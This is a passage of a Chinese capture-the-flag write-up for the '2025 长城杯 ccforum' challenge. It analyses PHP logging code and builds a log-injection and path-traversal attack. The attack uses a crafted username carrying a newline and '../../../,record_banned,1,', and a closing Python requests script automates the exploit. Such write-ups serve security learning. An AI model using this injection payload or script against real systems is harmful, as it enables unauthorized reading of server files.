19 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // 生成唯一的日志ID $log_id = uniqid(); // 对用户名进行编码 $e_username = encode_uname($username); // 格式化日志行 $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // 将日志行追加到操作日志文件中 file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } 看这个代码知道，log_id是唯一生成的，不可控制，e_username被加密，不好控制进行目录穿越，action要=record_banned,success=1，所以只能控制additional(它刚好为空)\n接下来寻找调用action_log的地方，也就是record_banned函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 function record_banned($username, $banned) { // 对用户名进行编码 $e_username = encode_uname($username); // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // 假设目录创建成功 $created = true; // 如果目录不存在，则尝试创建 if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // 设置目录权限为0750 } // 初始化日志信息和成功状态 $log = \u0026#34;\u0026#34;; $succ = 1; // 如果目录创建失败 if (!$created) { $succ = 0; // 设置成功状态为失败 $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // 记录错误信息 } else { // 构造文件名，使用当前时间戳 $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // 尝试将封禁内容写入文件 if (!file_put_contents($filename, $banned)) { $succ = 0; // 如果写入失败，设置成功状态为失败 $log = \u0026#34;Failed to record banned content\u0026#34;; // 记录错误信息 } } // 调用log_action函数记录封禁操作的日志 log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } 这里若是想传入/var/www/action.log后想要变量根目录所有文件，必须有某一行满足?(path[0]是id不用管)，../../../,record_banned,1,(path[4]无要求)，第一行是绝对不可能，因为username被base64加密，所以第一行就构造不了../../../（因为没有什么加密后是../../../）,所以就在第二行构造?,../../../,record_banned,1,?。那么就要在log下手了\n这里$log有3种情况，空或Failed to create record directory for \u0026quot; . $username;或\u0026quot;Failed to record banned content\u0026quot;；显然我们要通过构造username这个变量达到目的。所以log=\u0026ldquo;Failed to create record directory for \u0026quot; . $username;要到达这个目的，就要使创建目录失败，mkdir方法不可以创建多级目录，即其中不能包含/字符，也就是说username编码后包含/,恰好???编码后有/\n第二行怎么出来？显然要%0a,那还要满足第二行包括?,../../../,record_banned,? 那很显然了，username=???%0a,../../../,record_banned,1,\n所以写入/var/www/action.log的内容是\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???%0a,../../../,record_banned,1, 经过分行后第一行是\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???\n第二行是,../../../,record_banned,1, 符合要求！\n接下来找调用record_banned的函数，在post.php里\nhas_sensitive_words在config.php里\n显然要符合has_sensitive_words($title) || has_sensitive_words($content)，即让title或content存在敏感词或者 SENSITIVE WORDS\n所以解题思路、\n1.先注册用户username=???\\n,../../../,record_banned,1, password=111111111(任意内容，满足长度就好,手动注册的话\\n要写成%0a)\n2.访问post路由，post传参title或者content\n3.登入管理员账户，进入admin.php,拿到flag（爆破）\n直接打脚本也行，然后直接访问admin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from requests import Session basic = \u0026#34;http://ip:9090/\u0026#34; data = {\u0026#34;username\u0026#34;: \u0026#34;???\\n,../../../,record_banned,1,\u0026#34;,\u0026#34;password\u0026#34;: \u0026#34;111111111111\u0026#34;,} def register(sess: Session): resp = sess.post(basic + \u0026#34;/register.php\u0026#34;, data=data) def login(sess: Session): resp = sess.post(basic + \u0026#34;/login.php\u0026#34;, data=data) def post(sess: Session): data1 = { \u0026#34;title\u0026#34;: \u0026#34;敏感词\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;tset\u0026#34;, } resp = sess.post(basic + \u0026#34;/post.php\u0026#34;, data=data1) if __name__ == \u0026#34;__main__\u0026#34;: sess = Session() register(sess) login(sess) post(sess) ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-%E9%95%BF%E5%9F%8E%E6%9D%AF-ccforum/","title":"2025-长城杯-ccforum"}]